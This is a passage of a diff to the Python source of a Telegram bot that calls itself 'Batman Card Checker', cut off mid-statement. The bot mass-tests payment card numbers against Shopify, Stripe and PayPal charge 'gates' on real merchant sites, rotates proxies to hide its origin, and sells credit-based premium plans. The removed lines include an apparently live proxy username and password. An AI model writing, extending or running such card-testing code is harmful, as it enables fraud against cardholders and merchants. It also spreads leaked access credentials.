@@ -1,554 +1,546 @@
-import aiohttp
-import asyncio
+import logging
 import time
-import re
-from telegram import Update
-from telegram.ext import CommandHandler, ContextTypes
-from config import API_TIMEOUT, get_bin_info, kb_result
+import string
+import random
+import asyncio
+import signal
+import os
+import fcntl
+from typing import Optional
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application, CommandHandler, CallbackQueryHandler,
+    MessageHandler, filters, ContextTypes,
+)
+from telegram.error import Conflict, BadRequest, NetworkError
+
+import aiohttp as _aiohttp
+
+from config import (
+    BOT_TOKEN, OWNER_ID, VERSION, DEV_LINK,
+    CHANNEL_USERNAME, CHANNEL_LINK, GROUP_LINK, SUPPORT_LINK,
+    BOT_LINK, BOT_USERNAME, BOT_PHOTO_URL, BOT_PHOTO,
+    API_TIMEOUT, REFERRAL_CREDITS, LOCK_FILE,
+    GATE_URLS, GATE_SITES, PREMIUM_GATES, FORCE_CHANNELS,
+    get_bin_info, kb_result,
+)
+
+from msh import get_msh_handler, get_mchk_handler, get_mpp_handler
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 SHARED CONFIGURATION
+# LOGGING
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-MAX_CARDS = 50
-SEMAPHORE_LIMIT = 5
-
-def get_styled_plan(raw_plan: str) -> str:
-    plan_upper = raw_plan.upper()
-    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
-    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
-    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
-    else: return "Tʀɪᴀʟ"
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 SHOPIFY MASS CONFIGURATION
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SH_API = "https://autosh.up.railway.app/shopii"
-SH_GATE_NAME = "SHOPIFY MASS | 1$"
-SH_API_TIMEOUT = 120
+logging.getLogger("httpx").setLevel(logging.WARNING)
+logging.getLogger("telegram").setLevel(logging.WARNING)
+logging.basicConfig(
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
+)
+logger  = logging.getLogger(__name__)
+MAX_MSG = 4000
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 STRIPE MASS CONFIGURATION
+# INSTANCE LOCK
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-CHK_API_URL = "https://stripe-auth-test-production.up.railway.app/st0"
-CHK_SITE = "fashionspicex.com"
-CHK_TIMEOUT = 180
+_lock_file_handle = None
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 PAYPAL MASS CONFIGURATION
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-PP_NEW_API = "https://paypal0-1.onrender.com/pp1/cc={card}"
-PP_GATE_NAME = "PAYPAL MASS | 0.10 ᴜꜱᴅ"
-PP_TIMEOUT = API_TIMEOUT
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 PASTE YOUR PROXIES HERE (Used for Shopify only)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-PROXIES = [
-    "http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780",
-    "http://user:pass@ip:port",
-]
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 PASTE YOUR SITES HERE (Used for Shopify only)
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SITES = [
-    "https://powerbuild.store",
-    "https://examplestore.com",
-    "https://anotherstore.myshopify.com",
-]
-
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SHARED UTILITIES
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def parse_cards(text: str) -> list:
-    cards = []
-    parts = text.replace("|", "\n").replace(";", "\n").split("\n")
-    for p in parts:
-        c = p.strip()
-        if c and len(c) >= 13:
-            cards.append(c)
-    return cards
-
-
-async def _download_file_cards(bot, file_id: str) -> str | None:
-    """Download a text file from Telegram and return its content as string."""
+def acquire_instance_lock() -> bool:
+    global _lock_file_handle
     try:
-        file = await bot.get_file(file_id)
-        return file.decode("utf-8", errors="ignore")
-    except Exception:
-        return None
-
-
-async def extract_cards_from_update(update: Update, bot) -> list | None:
-    """
-    Extract cards from multiple input methods:
-    1. Reply to a text message containing cards
-    2. Reply to a file document containing cards (.txt)
-    3. Send a file directly as document (with /msh as caption)
-    4. Direct text after command: /msh cc|mm|yy|cvv
-    
-    Returns None if no valid cards found.
-    """
-    msg = update.message
-
-    # ── Method 1: Reply to message (text or file) ──
-    if msg.reply_to_message:
-        replied = msg.reply_to_message
-
-        # Reply to text message
-        if replied.text and replied.text.strip():
-            return parse_cards(replied.text)
-
-        # Reply to file document
-        if replied.document and replied.document.file_id:
-            text = await _download_file_cards(bot, replied.document.file_id)
-            if text:
-                return parse_cards(text)
-
-    # ── Method 2: Direct file sent (user sent file, /msh is caption) ──
-    if msg.document and msg.document.file_id:
-        text = await _download_file_cards(bot, msg.document.file_id)
-        if text:
-            return parse_cards(text)
-
-    # ── Method 3: Direct text after command ──
-    if msg.text and msg.text.strip():
-        # Remove command from text
-        text = msg.text
-        # If it's a command, extract args
-        if text.startswith('/'):
-            parts = text.split(maxsplit=1)
-            if len(parts) > 1:
-                return parse_cards(parts[1])
-        else:
-            return parse_cards(text)
-
-    return None
-
-
-class ProxyRotator:
-    def __init__(self, proxies: list):
-        self.proxies = proxies
-        self._index = 0
-
-    def next(self) -> str | None:
-        if not self.proxies: return None
-        proxy = self.proxies[self._index % len(self.proxies)]
-        self._index += 1
-        return proxy
-
-    def count(self) -> int:
-        return len(self.proxies)
-
-
-async def deduct_credits(context: ContextTypes.DEFAULT_TYPE, user_id: int, amount: int) -> bool:
-    """Returns True if success, False if not enough credits."""
-    ud = context.bot_data.get("user_data", {}).get(str(user_id), {})
-    is_premium = ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()
-    if is_premium:
+        _lock_file_handle = open(LOCK_FILE, "w")
+        fcntl.flock(_lock_file_handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
+        _lock_file_handle.write(str(os.getpid()))
+        _lock_file_handle.flush()
         return True
-    available = ud.get("credits", 0)
-    if available < amount:
+    except (IOError, OSError):
         return False
-    ud["credits"] = available - amount
+
+def release_instance_lock():
+    global _lock_file_handle
+    if _lock_file_handle:
+        try:
+            fcntl.flock(_lock_file_handle, fcntl.LOCK_UN)
+            _lock_file_handle.close()
+            os.unlink(LOCK_FILE)
+        except Exception:
+            pass
+        _lock_file_handle = None
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BOLD UNICODE FONT
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def B(text: str) -> str:
+    bold_map = {
+        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛',
+        'I':'𝗜','J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣',
+        'Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫',
+        'Y':'𝗬','Z':'𝗭','a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳',
+        'g':'𝗴','h':'𝗵','i':'𝗶','j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻',
+        'o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃',
+        'w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇','0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯',
+        '4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵',
+    }
+    return "".join(bold_map.get(ch, ch) for ch in text)
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# HELPERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def get_styled_plan(raw_plan: str) -> str:
+    p = raw_plan.upper()
+    if p == "CORE":  return "Cᴏʀᴇ"
+    if p == "ELITE": return "Eʟɪᴛᴇ"
+    if p == "ROOT":  return "Rᴏᴏᴛ"
+    return "Tʀɪᴀʟ"
+
+def get_plan_icon(raw_plan: str) -> str:
+    p = raw_plan.upper()
+    if p in ("CORE", "ELITE", "ROOT"): return "👑"
+    return ""
+
+def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
+    uid = str(user_id)
+    if "user_data" not in context.bot_data:
+        context.bot_data["user_data"] = {}
+    if uid not in context.bot_data["user_data"]:
+        context.bot_data["user_data"][uid] = {
+            "name": "User", "first_name": "User", "last_name": "",
+            "username": "", "language_code": "en",
+            "joined": datetime.now().strftime("%Y-%m-%d %H:%M"),
+            "last_active": datetime.now().strftime("%Y-%m-%d %H:%M"),
+            "credits": 150, "plan": "TRIAL", "expires": 0,
+            "total_refs": 0, "total_checks": 0,
+            "approved_checks": 0, "declined_checks": 0,
+            "last_gate": "N/A", "last_card": "N/A",
+            "codes_redeemed": 0, "keys_redeemed": 0,
+        }
+    return context.bot_data["user_data"][uid]
+
+def _update_user_meta(ud: dict, user) -> None:
+    ud["first_name"] = user.first_name or "User"
+    ud["last_name"] = user.last_name or ""
+    ud["name"] = user.full_name or user.first_name or "User"
+    ud["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M")
+    if user.username:
+        ud["username"] = user.username
+    if getattr(user, "language_code", None):
+        ud["language_code"] = user.language_code
+
+def gen_code(length: int = 10) -> str:
+    return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))
+
+def gen_receipt() -> str:
+    return f"Batman{random.randint(100000, 999999)}-CHK"
+
+def is_user_premium(ud: dict) -> bool:
+    return ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()
+
+def get_referral_link(user_id: int) -> str:
+    return f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
+
+def ui_profile(user, context: ContextTypes.DEFAULT_TYPE) -> str:
+    ud = get_user_data(user.id, context)
+    raw_plan = ud.get("plan", "TRIAL").upper()
+    expires = ud.get("expires", 0)
+    now = time.time()
+    if raw_plan != "TRIAL" and expires <= now:
+        raw_plan = "TRIAL"; ud["plan"] = "TRIAL"; ud["expires"] = 0; expires = 0
+    premium = raw_plan != "TRIAL"
+    credits = "Unlimited" if premium else str(ud.get("credits", 150))
+    uname = f"@{user.username}" if user.username else user.first_name or "User"
+    total_refs = ud.get("total_refs", 0)
+    plan_icon = get_plan_icon(raw_plan)
+    lines = [
+        f"[ 𖥷iТ ] Batman Card Checker",
+        f"━━━━━━━━━━━━━━━━━",
+        f"Uꜱᴇʀ    ➺ {uname} {plan_icon}".rstrip(),
+        f"ID      ➺ <code>{user.id}</code>",
+        f"Aᴄᴄᴇꜱꜱ  ➺ {get_styled_plan(raw_plan)}",
+        f"Cʀᴇᴅɪᴛꜱ ➺ {credits}",
+    ]
+    if premium and expires > now:
+        exp_date = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M")
+        rem_d = int((expires - now) / 86400)
+        rem_h = int(((expires - now) % 86400) / 3600)
+        lines.append(f"Exᴘɪʀᴇꜱ ➺ {exp_date}")
+        lines.append(f"Lᴇꜰᴛ    ➺ {rem_d}d {rem_h}h")
+        receipt = ud.get("last_receipt")
+        if receipt:
+            lines.append(f"Rᴇᴄᴇɪᴘᴛ ➺ <code>{receipt}</code>")
+    lines.append(f"Rᴇꜰᴇʀʀᴀʟꜱ ➺ {total_refs} (+{total_refs * REFERRAL_CREDITS} credits)")
+    lines.append(f"Jᴏɪɴᴇᴅ  ➺ {ud.get('joined', datetime.now().strftime('%Y-%m-%d'))}")
+    lines.append(f"Dᴇᴠ     ➺ <a href='{DEV_LINK}'>Batman</a>")
+    lines.append("━━━━━━━━━━━━━━━━━")
+    return "\n".join(lines)
+
+def gate_info_text(gate_name: str, cmd: str, cost: int) -> str:
+    return (
+        f"━━━━━━━━━━━━━━━━━\n{gate_name}\n━━━━━━━━━━━━━━━━━\n\n"
+        f"Cᴏsᴛ    ➺ {cost} Credit(s) per check\n\n"
+        f"Uꜱᴀɢᴇ:\n<code>/{cmd} cc|mm|yy|cvv</code>\n\n"
+        f"Exᴀᴍᴘʟᴇ:\n<code>/{cmd} 4111111111111111|12|2026|123</code>\n\n"
+        f"━━━━━━━━━━━━━━━━━"
+    )
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# FORCE SUBSCRIBE
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def check_force_sub(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> list:
+    if user_id == OWNER_ID:
+        return []
+    not_joined = []
+    for name, link in FORCE_CHANNELS:
+        try:
+            member = await context.bot.get_chat_member(f"@{name}", user_id)
+            if member.status in ("left", "kicked"):
+                not_joined.append((name, link))
+        except Exception:
+            not_joined.append((name, link))
+    return not_joined
+
+def kb_force_sub(not_joined: list) -> InlineKeyboardMarkup:
+    rows = []
+    for name, link in not_joined:
+        label = "📢 Join Channel" if "group" not in name.lower() else "💬 Join Group"
+        rows.append([InlineKeyboardButton(f"{label} ➺ @{name}", url=link)])
+    rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
+    return InlineKeyboardMarkup(rows)
+
+FORCE_SUB_TEXT = (
+    "[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ\n"
+    "━━━━━━━━━━━━━━━━━\n"
+    "You must join our channel & group to use this bot.\n"
+    "After joining press the ✅ Verify button below.\n"
+    "━━━━━━━━━━━━━━━━━"
+)
+
+async def require_membership(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    user_id = update.effective_user.id
+    not_joined = await check_force_sub(user_id, context)
+    if not_joined:
+        await update.message.reply_text(FORCE_SUB_TEXT, reply_markup=kb_force_sub(not_joined))
+        return False
     return True
 
-
-def get_user_plan_ui(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> str:
-    ud = context.bot_data.get("user_data", {}).get(str(user_id), {})
-    raw_plan = ud.get("plan", "TRIAL").upper()
-    if raw_plan != "TRIAL" and ud.get("expires", 0) <= time.time():
-        raw_plan = "TRIAL"
-    return get_styled_plan(raw_plan)
-
-
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 SHOPIFY MASS WORKERS & COMMAND
+# CARD CHECK RESULT UI
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def check_single_shopify_card(session: aiohttp.ClientSession, card: str, site: str, proxy: str | None, semaphore: asyncio.Semaphore) -> dict:
-    async with semaphore:
-        params = {"cc": card, "site": site}
-        if proxy: params["proxy"] = proxy
-        try:
-            async with session.get(SH_API, params=params) as resp:
-                try: 
-                    data = await resp.json(content_type=None)
-                except Exception: 
-                    data = {"Response": await resp.text(), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
-                if not isinstance(data, dict): 
-                    data = {"Response": str(data), "Status": "false", "Gateway": "N/A", "Price": "N/A", "CC": card}
-                return {
-                    "card": card, 
-                    "gateway": data.get("Gateway", "N/A"), 
-                    "price": data.get("Price", "N/A"), 
-                    "response": str(data.get("Response", "ERROR")), 
-                    "status": str(data.get("Status", "false")).lower(), 
-                    "cc_used": data.get("CC", card), 
-                    "error": None
-                }
-        except asyncio.TimeoutError: 
-            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false"}
-        except Exception as e: 
-            return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false"}
-
-async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.bot_data.get("msh_on", True):
-        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
-        return
-
-    # ── Extract cards from text, reply, or file ──
-    cards = await extract_cards_from_update(update, context.bot)
-    if not cards:
-        await update.message.reply_text(
-            "⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱ ᴡᴇɴᴅ ᴡɪᴴʟᴇ ᴡᴏʟ ᴡᴏʟꜰ, ᴏʀ ʀᴇᴘʟʏ ᴀ ꜰꜱᴇ ᴀ ꜰᴇɪᴄᴇ ᴡɪꜱꜱ\n\n"
-            "• Sᴇɴᴅ ᴛɪʟᴇ ᴀꜱ ꜱᴇ ᴀꜱᴇ ᴀꜱᴇ ᴡɪꜱꜱ\n"
-            "• Rᴇᴘʟʏ ᴛᴏ ᴛᴏꜱ ᴛᴏꜱ ᴡᴏʟꜰ, ᴛᴏᴛᴏꜱ /msh ᴀꜱ ᴀꜱ ꜱ ᴛᴏᴡᴏꜰ\n"
-            "• Oʀ ᴜᴇᴄᴇᴇ ᴄᴀʀᴅꜱ ᴡᴏʟꜰ ᴡᴇᴏᴅ ᴛᴏꜱ\n\n"
-            "Fᴏʀᴍᴀᴛ: <code>/msh cc|mm|yy|cvv</code>",
-            parse_mode="HTML",
-        )
-        return
-
-    if len(cards) > MAX_CARDS:
-        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴏ ᴘʀ ʀᴜɴ. Yᴏᴜꜱ ꜱᴇ ꜱᴇɴᴛ: {len(cards)}", parse_mode="HTML")
-        return
-
-    if not await deduct_credits(context, update.effective_user.id, len(cards)):
-        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
-        await update.message.reply_text(
-            f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", 
-            parse_mode="HTML"
-        )
-        return
-
-    rotator = ProxyRotator(PROXIES)
-    sites = SITES if SITES else ["https://powerbuild.store"]
-    proxy_info = f"Pʀᴏxɪᴇꜱꜱ ➺ {rotator.count()}" + (" (Nᴏɴᴇ)" if not PROXIES else "")
-    msg = await update.message.reply_text(
-        f"🦇 {SH_GATE_NAME}\n━━━━━━━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n{proxy_info}\n🌐 Sɪᴛᴇꜱꜱ ➺ {len(sites)}\n━━━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱꜱ...", 
-        parse_mode="HTML"
-    )
-
-    bin_task = get_bin_info(cards[0][:6])
-    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
-    start_time = time.time()
-
-    async with aiohttp.ClientSession(
-        timeout=aiohttp.ClientTimeout(total=SH_API_TIMEOUT), 
-        connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)
-    ) as session:
-        tasks = [
-            check_single_shopify_card(session, c, sites[i % len(sites)], rotator.next(), semaphore) 
-            for i, c in enumerate(cards)
-        ]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-
-    try: 
-        bin_data = await bin_task if asyncio.iscoroutine(bin_task) else bin_task
-    except Exception: 
-        bin_data = {"error": True}
-
-    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false"} for r in results]
-    approved_list = [r for r in parsed if not r.get("error") and (r["status"] == "true" or "approved" in r["response"].lower())]
-    error_list = [r for r in parsed if r.get("error")]
-
-    u = update.effective_user.username or update.effective_user.first_name or "User"
+def build_check_result(
+    card_raw: str, gate_name: str, raw_response: str,
+    bin_data: dict, username: str, plan: str, time_taken: str,
+    is_approved: bool, is_timeout: bool = False, is_error: bool = False,
+) -> str:
+    if is_timeout: status = "Tɪᴍᴇᴏᴜᴛ"
+    elif is_error: status = "Eʀʀᴏʀ"
+    elif is_approved: status = "Aᴘᴘʀᴏᴠᴇᴅ"
+    else: status = "Dᴇᴄʟɪɴᴇᴅ"
+    plan_icon = get_plan_icon(plan)
+    plan_label = get_styled_plan(plan)
     bin_txt = "N/A"
     if bin_data and not bin_data.get("error"):
-        s = str(bin_data.get("scheme", "N/A")).upper()
-        t = str(bin_data.get("type", "N/A")).upper()
-        b = bin_data.get("bank", "N/A")
+        scheme = str(bin_data.get("scheme", "N/A")).upper()
+        bank = bin_data.get("bank", "N/A")
         country = str(bin_data.get("country", "N/A")).upper()
         flag = bin_data.get("country_emoji", "")
-        bin_txt = f"{s} - {t} - {b}"
-
+        bin_txt = f"{scheme} - {bank} - {flag} {country}".strip()
+    uname_display = f"{username} {plan_icon} ({plan_label})".strip()
     lines = [
-        f"🦇 {SH_GATE_NAME} ➛ Cᴏᴍᴘᴘʟᴇᴛᴇᴅ", "━━━━━━━━━━━━━━━━━━━━",
-        f"📊 Tᴏᴛᴛᴀʟ ➺ {len(parsed)}", f"✅ Aᴘᴘʀᴏᴠᴏᴠᴇᴅ ➺ {len(approved_list)}",
-        f"❌ Dᴇᴄʟɪɴᴇᴅᴅ ➺ {len(parsed) - len(approved_list) - len(error_list)}",
-        f"⚠️ Eʀʀᴏʀꜱꜱꜱ ➺ {len(error_list)}",
-        f"⏱️ Tɪᴍᴇ ➺ {time.time() - start_time:.2f}s", "━━━━━━━━━━━━━━━━━━",
+        f"[ 𖥷iТ ] ➺ {status}",
+        f"🔍 ➺ <code>{card_raw}</code>",
+        f"Gᴀᴛᴇ ➺ {gate_name} 💳",
+        f"Rᴀᴡ  ➺ {raw_response}",
+        f"Iɴꜰᴏ ➺ {bin_txt}",
+        f"Uꜱᴇʀ ➺ {uname_display}",
+        f"Pʀᴏ  ➺ Batman | {time_taken}s",
     ]
+    return "\n".join(lines)
 
-    approved_lines = []
-    if approved_list:
-        approved_lines.append(f"\n✅ Aᴘᴘᴘʀᴏᴠᴇᴅ ({len(approved_list)})")
-        approved_lines.append("━━━━━━━━━━━━━━━━━━━━")
-        for i, r in enumerate(approved_list, 1):
-            masked = r["card"][:6] + "xxxx" + r["card"][-4:] if len(r["card"]) > 10 else r["card"]
-            approved_lines.append(f"  {i}. <code>{masked}</code>\n     Gᴀᴛᴇᴡᴀʏ ➺ {r['gateway']}\n     Pʀɪᴄᴄᴇ ➺ ${r['price']}\n     Rᴇꜱꜱᴘ ➺ {r['response'][:50]}")
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# KEYBOARDS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def kb_main(user_id: int) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(B("CHECKER"), callback_data="mgates"),
+         InlineKeyboardButton(B("BUY NOW"), callback_data="mprice")],
+        [InlineKeyboardButton(B("UPDATES") + " ➺", url=CHANNEL_LINK),
+         InlineKeyboardButton(B("GROUP") + " ➺", url=GROUP_LINK)],
+        [InlineKeyboardButton("🔗 " + B("REFER & EARN"), callback_data="mrefer")],
+        [InlineKeyboardButton(B("SUPPORT") + " ➺", url=SUPPORT_LINK)],
+    ])
 
-    footer_lines = [f"\n━━━━━━━━━━━━━━━━", f"🏦 Bɪɴ ➺ {bin_txt}", "━━━━━━━━━━━━━━━━", f"🦇 Uꜱᴇʀ ➺ {u}"]
-    full_text = "\n".join(lines + approved_lines + footer_lines)
+def kb_back(cb: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 " + B("BACK"), callback_data=cb)]])
 
-    if len(full_text) <= 4000:
-        try: 
-            await msg.edit_text(full_text, parse_mode="HTML", reply_markup=kb_result(), disable_web_page_preview=True)
-        except Exception: 
-            await msg.edit_text(full_text[:4000], parse_mode="HTML", reply_markup=kb_result())
+def kb_price() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(B("10$ - CORE"), callback_data="pay10"),
+         InlineKeyboardButton(B("15$ - ELITE"), callback_data="pay15"),
+         InlineKeyboardButton(B("30$ - ROOT"), callback_data="pay30")],
+        [InlineKeyboardButton(B("SUPPORT") + " ➺", url=SUPPORT_LINK)],
+        [InlineKeyboardButton("🔙 " + B("BACK"), callback_data="bmain")],
+    ])
+
+def kb_payment() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(B("SUPPORT") + " ➺", url=SUPPORT_LINK)],
+        [InlineKeyboardButton("🔙 " + B("BACK"), callback_data="mprice")],
+    ])
+
+def kb_gate_main() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(B("AUTH"), callback_data="mauth"),
+         InlineKeyboardButton(B("CHARGE"), callback_data="mcharge"),
+         InlineKeyboardButton("👑 " + B("PREMIUM"), callback_data="mmass")],
+        [InlineKeyboardButton("🔙 " + B("BACK"), callback_data="bmain")],
+    ])
+
+def kb_auth_gates() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(B("BRAINTREE"), callback_data="ib3")],
+        [InlineKeyboardButton("🔙 " + B("BACK"), callback_data="mgates")],
+    ])
+
+def kb_charge_gates() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(B("STRIPE"), callback_data="ichk"),
+         InlineKeyboardButton(B("PAYPAL"), callback_data="ipp")],
+        [InlineKeyboardButton(B("SHOPIFY"), callback_data="ish"),
+         InlineKeyboardButton(B("PAYU"), callback_data="ipyu")],
+        [InlineKeyboardButton("🔙 " + B("BACK"), callback_data="mgates")],
+    ])
+
+def kb_premium_gates() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton(B("STRIPE AUTH") + " 👑", callback_data="iau")],
+        [InlineKeyboardButton(B("STRIPE MASS") + " 👑", callback_data="imss")],
+        [InlineKeyboardButton(B("PAYPAL MASS") + " 👑", callback_data="impp2")],
+        [InlineKeyboardButton("🔙 " + B("BACK"), callback_data="mgates")],
+    ])
+
+def kb_upgrade() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("💎 " + B("BUY PREMIUM"), callback_data="mprice")],
+        [InlineKeyboardButton(B("SUPPORT") + " ➺", url=SUPPORT_LINK)],
+    ])
+
+def kb_fb_owner(key: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("✅ Approve", callback_data=f"fb_ok_{key}"),
+        InlineKeyboardButton("❌ Decline", callback_data=f"fb_no_{key}"),
+    ]])
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# REFERRAL SYSTEM
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def process_referral(new_user_id: int, referrer_id: int,
+                            context: ContextTypes.DEFAULT_TYPE) -> bool:
+    if new_user_id == referrer_id: return False
+    referred_set = context.bot_data.setdefault("referred_users", set())
+    if new_user_id in referred_set: return False
+    referrer_ud = context.bot_data.get("user_data", {}).get(str(referrer_id))
+    if referrer_ud is None: return False
+    referred_set.add(new_user_id)
+    referrer_ud["credits"] = referrer_ud.get("credits", 0) + REFERRAL_CREDITS
+    referrer_ud["total_refs"] = referrer_ud.get("total_refs", 0) + 1
+    try:
+        await context.bot.send_message(
+            chat_id=referrer_id,
+            text=(f"Rᴇꜰᴇʀʀᴀʟ Bᴏɴᴜꜱ\n━━━━━━━━━━━━━━━━━\n"
+                  f"Someone joined via your link!\n"
+                  f"Cʀᴇᴅɪᴛꜱ Aᴅᴅᴇᴅ    ➺ +{REFERRAL_CREDITS}\n"
+                  f"Tᴏᴛᴀʟ Rᴇꜰᴇʀʀᴀʟꜱ ➺ {referrer_ud['total_refs']}\n"
+                  f"━━━━━━━━━━━━━━━━━"),
+        )
+    except Exception: pass
+    return True
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# GATE PROCESSING
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _api_request(session, url: str, card: str, site: str) -> dict:
+    if "{card}" in url:
+        url = url.replace("{card}", card)
+        async with session.get(url) as resp:
+            try: data = await resp.json(content_type=None)
+            except: data = {"value": await resp.text()}
     else:
-        try: 
-            await msg.edit_text(
-                "\n".join(lines) + "\n\n📜 Fᴜʟʟ ʀᴇꜱꜱᴛ sᴇɴᴛ ʙᴇʟᴏᴡ ⬇️" + "\n".join(footer_lines), 
